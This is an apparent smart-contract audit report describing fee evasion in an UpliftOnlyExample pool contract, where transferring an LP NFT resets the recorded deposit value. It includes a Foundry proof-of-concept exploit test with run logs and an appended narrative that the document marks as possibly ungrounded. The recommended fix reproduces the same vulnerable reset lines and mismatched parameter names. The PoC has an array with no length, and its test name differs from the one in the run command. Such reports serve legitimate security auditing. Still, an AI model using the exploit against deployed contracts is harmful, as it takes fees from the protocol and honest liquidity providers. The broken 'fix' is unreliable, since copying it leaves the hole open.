---
id: 13861
severity: "High"
---

# Fee Evasion via LP Token Transfer Resets Deposit Value

## Description

Within the UpliftOnlyExample contract, liquidity providers receive LP NFTs to represent their share in the pool. However, this LP NFT can be freely transferred to another address. When such a transfer occurs, the contract resets feeDataArray[tokenIdIndex].lpTokenDepositValue to the current pool value (i.e., it updates to lpTokenDepositValueNow).

Because the liquidity-removal fee in this protocol depends on the increase (uplift) in the pool’s value since the time of deposit, a higher lpTokenDepositValue means a higher total value is used to calculate fees. By resetting lpTokenDepositValue to the current value via an NFT transfer, users can effectively reduce or bypass paying the additional uplift-related fee when they subsequently withdraw liquidity.

This behavior undermines one of the protocol’s core mechanisms, which is supposed to charge additional fees based on any increase in the value of the liquidity token (“uplift”) from the original deposit time. As a result, attackers can circumvent the intended fee logic and withdraw liquidity with a significantly lower fee than designed.

The issue stems from the afterUpdate function that runs post-transfer of the LP NFT. This function resets lpTokenDepositValue (and blockTimestampDeposit) to the current time and pool value, effectively discarding the original deposit history. Consequently, the fee calculation logic, which relies on the difference between the original deposit value and the current value, is subverted.

```solidity
feeDataArray[tokenIdIndex].lpTokenDepositValue = lpTokenDepositValueNow;
feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
feeDataArray[tokenIdIndex].upliftFeeBps = upliftFeeBps;

//actual transfer not a afterTokenTransfer caused by a burn
poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);
```

Because the deposit value is updated at each transfer, this makes the subsequent withdraw operation treat the liquidity as if it were deposited at the new price rather than the original (lower) price.

By transferring the LP NFT to a fresh address (or another account controlled by the same user), the user can reset the reference deposit price to the current (higher) price, eliminating any “gains” that would have triggered a fee. This effectively allows them to pay only the minimal withdrawal fee instead of the intended uplift fee. Financial Loss to Protocol

The protocol’s revenue mechanism is compromised because users can avoid paying the intended uplift fees. Over time, this can result in significant losses to the protocol, as it no longer collects fair compensation for the increase in token value. Undermines Core Protocol Logic

The main feature of controlling Impermanent Loss and charging fees on liquidity growth is effectively negated. This can lead to an unbalanced economic model, where malicious actors gain extra profit at the expense of honest users and the protocol itself.

## Proof of Concept

Below is a test scenario demonstrating how transferring the LP NFT can reduce or bypass the uplift fee:

```solidity
function testpoctransferRemoveLiquiditymakelowfee() public {
    uint256 snapshotId = vm.snapshot();
    
    // Test remove Liquidity with no transfer
    // Add Liquidity
    uint256[] memory maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
    vm.prank(bob);
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
    vm.stopPrank();

    // setMockPrices
    int256[] memory prices = new int256[]();
    for (uint256 i = 0; i < tokens.length; ++i) {
        prices[i] = int256(i) * 10e18; // 10x
    }
    updateWeightRunner.setMockPrices(pool, prices);

    uint256[] memory minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

    BaseVaultTest.Balances memory balancesBefore = getBalances(bob);

    // Remove Liquidity
    vm.startPrank(bob);
    upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
    vm.stopPrank();
    BaseVaultTest.Balances memory balancesAfter = getBalances(bob);

    console.log("Bob's DAI amountOut: ", balancesAfter.bobTokens[daiIdx] - balancesBefore.bobTokens[daiIdx]);
    console.log("Bob's USDC amountOut: ", balancesAfter.bobTokens[usdcIdx] - balancesBefore.bobTokens[usdcIdx]);

    vm.revertTo(snapshotId);

    // Add Liquidity
    maxAmountsIn = [dai.balanceOf(bob), usdc.balanceOf(bob)].toMemoryArray();
    vm.prank(bob);
    upliftOnlyRouter.addLiquidityProportional(pool, maxAmountsIn, bptAmount, false, bytes(""));
    vm.stopPrank();

    // setMockPrices
    prices = new int256[](tokens.length);
    for (uint256 i = 0; i < tokens.length; ++i) {
        prices[i] = int256(i) * 10e18; // 10x
    }
    updateWeightRunner.setMockPrices(pool, prices);

    minAmountsOut = [uint256(0), uint256(0)].toMemoryArray();

    balancesBefore = getBalances(alice);

    // transfer to alice
    uint256 expectedTokenId = 1;

    LPNFT lpNft = upliftOnlyRouter.lpNFT();

    vm.prank(bob);
    lpNft.transferFrom(bob, alice, expectedTokenId);

    // Alice Remove Liquidity
    vm.startPrank(alice);
    upliftOnlyRouter.removeLiquidityProportional(bptAmount, minAmountsOut, false, pool);
    vm.stopPrank();
    balancesAfter = getBalances(alice);

    console.log("After transfer Alice's DAI amountOut: ", balancesAfter.aliceTokens[daiIdx] - balancesBefore.aliceTokens[daiIdx]);
    console.log("After transfer Alice's USDC amountOut: ", balancesAfter.aliceTokens[usdcIdx] - balancesBefore.aliceTokens[usdcIdx]);
}
```

Running this test (forge test --mt testtransferRemoveLiquidity_fee -vv) shows that the liquidity withdrawn by Alice (who received the NFT via transfer) is higher than Bob’s direct withdrawal, indicating lower fees were applied.

```diff
bshyuunn@hyuunn-MacBook-Air pool-hooks % forge test --mt testtransferRemoveLiquidity_fee -vv
[⠰] Compiling...
[⠒] Compiling 1 files with Solc 0.8.26
[⠰] Solc 0.8.26 finished in 116.66s
Compiler run successful with warnings:

Warning: the following cheatcode(s) are deprecated and will be removed in future versions:
  snapshot(): replaced by snapshotState
  revertTo(uint256): replaced by revertToState
Ran 1 test for test/foundry/UpliftExample.t.sol:UpliftOnlyExampleTest
[PASS] testtransferRemoveLiquidity_fee() (gas: 1608352)
Logs:
  Bob's DAI amountOut:  820000000000000000000
  Bob's USDC amountOut:  820000000000000000000
  After transfer Alice's DAI amountOut:  999500000000000000000
  After transfer Alice's USDC amountOut:  999500000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 76.97ms (13.28ms CPU time)

Ran 1 test suite in 439.49ms (76.97ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Recommendation

A straightforward approach to allow LP NFT transfers without undermining fee calculations is to retain the original deposit data (including lpTokenDepositValue) even after the NFT is transferred.

```solidity
    function afterUpdate(address from, address to, uint256 _tokenID) public {
        if (msg.sender != address(lpNFT)) {
            revert TransferUpdateNonNft(from, to, msg.sender, _tokenID);
        }

        address poolAddress = nftPool[_tokenID];

        if (poolAddress == address(0)) {
            revert TransferUpdateTokenIDInvaid(from, to, _tokenID);
        }

        int256[] memory prices = IUpdateWeightRunner(_updateWeightRunner).getData(poolAddress);
        uint256 lpTokenDepositValueNow = getPoolLPTokenValue(prices, poolAddress, MULDIRECTION.MULDOWN);

        FeeData[] storage feeDataArray = poolsFeeData[poolAddress][_from];

        uint256 feeDataArrayLength = feeDataArray.length;
        uint256 tokenIdIndex;
        bool tokenIdIndexFound = false;

        //find the tokenID index in the array
        for (uint256 i; i < feeDataArrayLength; ++i) {
            if (feeDataArray[i].tokenID == _tokenID) {
                tokenIdIndex = i;
                tokenIdIndexFound = true;
                break;
            }
        }

        if (tokenIdIndexFound) {
            if (_to != address(0)) {
                // Update the deposit value to the current value of the pool in base currency (e.g. USD) and the block index to the current block number
                //vault.transferLPTokens(from, to, feeDataArray[i].amount);
                feeDataArray[tokenIdIndex].lpTokenDepositValue = lpTokenDepositValueNow;
                feeDataArray[tokenIdIndex].blockTimestampDeposit = uint32(block.number);
                feeDataArray[tokenIdIndex].upliftFeeBps = upliftFeeBps;

                //actual transfer not a afterTokenTransfer caused by a burn
                poolsFeeData[poolAddress][_to].push(feeDataArray[tokenIdIndex]);

                if (tokenIdIndex != feeDataArrayLength - 1) {
                    //Reordering the entire array could be expensive but it is the only way to keep true FILO
                    for (uint i = tokenIdIndex + 1; i < feeDataArrayLength; i++) {
                        delete feeDataArray[i - 1];
                        feeDataArray[i - 1] = feeDataArray[i];
                    }
                }

                delete feeDataArray[feeDataArrayLength - 1];
                feeDataArray.pop();
            }
        }
    }
```

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a fee‑evasion flaw that arises when the liquidity‑provider (LP) NFT representing a share of a pool can be transferred to another address. The contract’s afterUpdate hook, which is executed after every NFT transfer, overwrites the stored lpTokenDepositValue and blockTimestampDeposit with the current pool valuation and block number. Because the protocol’s uplift fee is calculated as the difference between the original deposit value and the current pool value, resetting these fields effectively discards the original deposit history. An attacker can therefore transfer the LP NFT to a fresh address they control, causing the contract to treat the liquidity as if it were newly deposited at the higher price. When the attacker subsequently withdraws liquidity, the uplift component of the fee is dramatically reduced or eliminated, leaving only the minimal base withdrawal fee. This results in the user receiving a larger token amount than expected, while the protocol collects far less revenue than designed. The issue manifests whenever the LP NFT is freely transferable and the afterUpdate function runs, which is the default behaviour of the contract. All liquidity providers, the protocol’s revenue model, and honest participants are affected because the core economic mechanism that compensates for token value growth is subverted. The flaw was discovered during a security audit and reproduced with a test that transferred the NFT and compared withdrawal outcomes, showing a noticeable increase in the withdrawn amounts. The bug is hard to notice because the transfer appears legitimate and the fee calculation still executes, but the underlying accounting data has been silently reset, making the fee appear correct on the surface. To remediate the issue, the contract should preserve the original deposit value and timestamp across NFT transfers, or disallow transfers altogether, or adjust the fee logic to reference immutable historical data rather than mutable fields that are overwritten on transfer. This class of vulnerability can be described as a state‑reset or accounting‑data‑mutation bug that enables fee manipulation by altering the reference point used for fee calculations.
